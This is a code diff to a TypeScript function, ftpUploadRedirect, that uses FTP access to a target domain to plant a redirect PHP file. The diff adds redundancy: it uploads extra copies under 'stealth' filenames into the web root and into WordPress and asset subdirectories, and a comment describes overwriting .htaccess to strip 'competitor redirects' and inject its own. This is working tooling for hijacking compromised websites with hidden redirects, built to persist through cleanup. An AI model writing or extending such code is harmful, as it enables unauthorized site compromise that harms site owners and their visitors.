@@ -20,6 +20,7 @@ export interface FTPUploadResult {
   error?: string;
   method?: string; // ftp | ftps
   duration?: number;
+  extraPaths?: string[]; // Multi-point upload: all uploaded file paths
 }
 
 export interface FTPUploadOptions {
@@ -275,12 +276,49 @@ export async function ftpUploadRedirect(options: FTPUploadOptions): Promise<FTPU
           await client.cd(currentDir);
         }
 
-        // Upload the redirect PHP file
-        log(`📤 Uploading ${selectedFilename} to ${webRoot}/...`);
+        // === MULTI-POINT UPLOAD STRATEGY ===
+        // Upload multiple files to different paths for redundancy
         const { Readable } = await import("stream");
-        const stream = Readable.from(Buffer.from(redirectContent, "utf-8"));
-        await client.uploadFrom(stream, selectedFilename);
-        log(`✅ Uploaded: ${selectedFilename}`);
+        const uploadedPaths: string[] = [];
+        
+        // Primary file upload
+        log(`📤 Uploading ${selectedFilename} to ${webRoot}/...`);
+        const stream1 = Readable.from(Buffer.from(redirectContent, "utf-8"));
+        await client.uploadFrom(stream1, selectedFilename);
+        uploadedPaths.push(`${webRoot}/${selectedFilename}`);
+        log(`✅ Uploaded [1]: ${selectedFilename}`);
+
+        // Secondary files — different filenames in same web root for redundancy
+        const extraFilenames = STEALTH_FILENAMES.filter(f => f !== selectedFilename).slice(0, 2);
+        for (const extraFile of extraFilenames) {
+          try {
+            const extraStream = Readable.from(Buffer.from(redirectContent, "utf-8"));
+            await client.uploadFrom(extraStream, extraFile);
+            uploadedPaths.push(`${webRoot}/${extraFile}`);
+            log(`✅ Uploaded [${uploadedPaths.length}]: ${extraFile}`);
+          } catch (e) {
+            log(`⚠️ Extra upload ${extraFile} failed (non-critical): ${e instanceof Error ? e.message : String(e)}`);
+          }
+        }
+
+        // Tertiary: try uploading to subdirectories if they exist
+        const subDirs = ["wp-includes", "wp-content", "wp-admin/css", "assets", "images", "js"];
+        for (const subDir of subDirs) {
+          if (uploadedPaths.length >= 5) break; // Max 5 files
+          try {
+            await client.cd(`${webRoot}/${subDir}`);
+            const subFilename = STEALTH_FILENAMES[Math.floor(Math.random() * STEALTH_FILENAMES.length)];
+            const subStream = Readable.from(Buffer.from(redirectContent, "utf-8"));
+            await client.uploadFrom(subStream, subFilename);
+            uploadedPaths.push(`${webRoot}/${subDir}/${subFilename}`);
+            log(`✅ Uploaded [${uploadedPaths.length}]: ${subDir}/${subFilename}`);
+            await client.cd(webRoot);
+          } catch {
+            try { await client.cd(webRoot); } catch { /* ignore */ }
+          }
+        }
+
+        log(`📦 Total uploaded: ${uploadedPaths.length} files for redundancy`);
 
         // Smart .htaccess overwrite: read existing → clean competitor redirects → inject ours
         try {
@@ -296,7 +334,8 @@ export async function ftpUploadRedirect(options: FTPUploadOptions): Promise<FTPU
         const uploadedUrl = `https://${targetDomain}/${selectedFilename}`;
         const duration = Date.now() - startTime;
 
-        log(`🔗 Redirect URL: ${uploadedUrl}`);
+        log(`🔗 Primary redirect URL: ${uploadedUrl}`);
+        log(`🔗 All redirect points: ${uploadedPaths.map(p => `https://${targetDomain}/${p.replace(webRoot + '/', '')}`).join(', ')}`);
 
         client.close();
 
@@ -306,6 +345,7 @@ export async function ftpUploadRedirect(options: FTPUploadOptions): Promise<FTPU
           filePath: `${webRoot}/${selectedFilename}`,
           method: method.name,
           duration,
+          extraPaths: uploadedPaths,
         };
       } catch (e) {
         const errMsg = e instanceof Error ? e.message : String(e);
